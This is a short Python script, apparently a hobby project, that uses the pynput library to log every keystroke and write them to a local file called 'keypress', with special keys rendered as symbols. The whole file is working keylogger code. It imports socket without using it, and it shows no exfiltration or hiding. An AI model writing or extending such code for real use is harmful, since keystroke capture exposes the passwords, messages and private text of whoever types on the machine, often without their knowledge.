import pynput 
from pynput.keyboard import Key, Listener
import socket
import os
count = 0
keys = []
def press(key):
    global keys, count
    keys.append(key)
    count += 1  # only use if needed to wiite more than single keys in file
    #print("{0} pressed".format(key)) #display key pressed in terminal
    #if count >= 3:#
     #   count = 0
    write_file(keys)

def write_file(keys):
    with open(os.getcwd() + "/keypress" ,"w+") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("backspace") > 0:
                f.write(" ⟵ ")
            elif k.find("space") > 0:
                f.write("\t")
            elif k.find("cmd")> 0:
                f.write(" ⌘ ")
            elif k.find("enter") > 0:
                #entt = "↵"
                f.write("↵")
                f.write("\n")
            elif k.find("tab") > 0:
                f.write(" ↹ ")
            elif k.find("alt") > 0:
                f.write("Alt")
            elif k.find("shift") > 0:
                f.write(" ⇧ ")
            elif k.find("ctrl") > 0:
                f.write("ctrl")
            elif k.find("Key") == -1:
                f.write(k)
                #f.close()
               
            
def release(key):
    if key == Key.esc:
        return False

with Listener (on_press=press, on_release=release) as listener:
    listener.join()


